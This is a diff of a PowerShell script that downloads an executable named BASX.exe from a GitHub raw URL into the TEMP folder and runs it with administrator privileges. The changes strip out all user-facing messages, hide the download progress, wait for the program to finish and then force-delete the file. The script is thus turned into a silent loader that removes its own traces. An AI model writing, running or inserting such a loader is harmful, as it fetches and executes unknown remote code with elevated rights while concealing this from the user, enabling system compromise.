@@ -1,14 +1,13 @@
-Write-Host "BASX" -ForegroundColor White
-
 $url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
-
 $output = "$env:TEMP\BASX.exe"
 
-Write-Host "[*] Downloading BASX System..." -ForegroundColor Yellow
-
+$ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest -Uri $url -OutFile $output
 
-Write-Host "[+] Download Success!" -ForegroundColor Green
-Write-Host "[*] Requesting Administrator Privileges..." -ForegroundColor Yellow
+Start-Process -FilePath $output -Verb RunAs -Wait
 
-Start-Process -FilePath $output -Verb RunAs
+if (Test-Path $output) {
+    Remove-Item -Path $output -Force
+}
+
+exit
